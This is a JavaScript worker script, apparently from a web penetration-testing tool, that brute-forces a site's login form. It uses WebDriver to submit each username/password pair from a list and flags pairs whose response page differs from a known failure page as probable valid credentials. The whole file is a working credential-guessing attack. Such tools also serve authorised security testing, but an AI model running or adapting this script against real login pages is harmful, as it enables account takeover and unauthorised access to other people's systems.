const fs = require('fs')
const jetpack = require('fs-jetpack')
const WebDriver = require('../utils/WebDriver')
const stringSimilarity = require('string-similarity')

class BruteForceSubTask {

	start(path, configPath, serverHome, id) {

		let webDriver = new WebDriver()
		let forceExit = false

		process.on('message', () => {
			forceExit = true
		})

		this.jsonconfig = JSON.parse(jetpack.read(configPath))
		let data = JSON.parse(jetpack.read(path))

		console.log(['Starting worker bruteforce id', id, 'with', data.length, 'combinations'].join(' '))

		webDriver.goTo(serverHome, 0)

		webDriver.doLogin('red-face', '-1', this.jsonconfig.taskdata.bruteforcetab.data.loginFormXPathExpr, this.jsonconfig.taskdata.bruteforcetab.data.loginNameXPathExpr, this.jsonconfig.taskdata.bruteforcetab.data.loginPswXPathExpr, 0)
		let errorPage = webDriver.getDocumentText(0)
		for (let i = 0; i < data.length; i++) {
			console.log(['---------------------Testing', data[i][0], data[i][1]].join(' '))
			webDriver.goTo(serverHome, 0)
			webDriver.doLogin(data[i][0], data[i][1], this.jsonconfig.taskdata.bruteforcetab.data.loginFormXPathExpr, this.jsonconfig.taskdata.bruteforcetab.data.loginNameXPathExpr, this.jsonconfig.taskdata.bruteforcetab.data.loginPswXPathExpr, 0)

			let tmp = webDriver.getDocumentText(0)
			let similarity = stringSimilarity.compareTwoStrings(errorPage, tmp)

			if ((similarity * 100) < 1) {
				console.log('!!!!! Probably found credentials')
				console.log([data[i][0], data[i][1]].join(' '))
			}
			if(forceExit) {
				break
			}
		}
		webDriver.closeDriver()

		fs.unlink(path, (err) => {
			if (err) {
				throw err
			}
		})

		if(forceExit) {
			process.exit()
		}
		console.log(['Closing worker id', id].join(' '))
	}
}

new BruteForceSubTask()
	.start(process.argv[2], process.argv[3], process.argv[4], process.argv[5])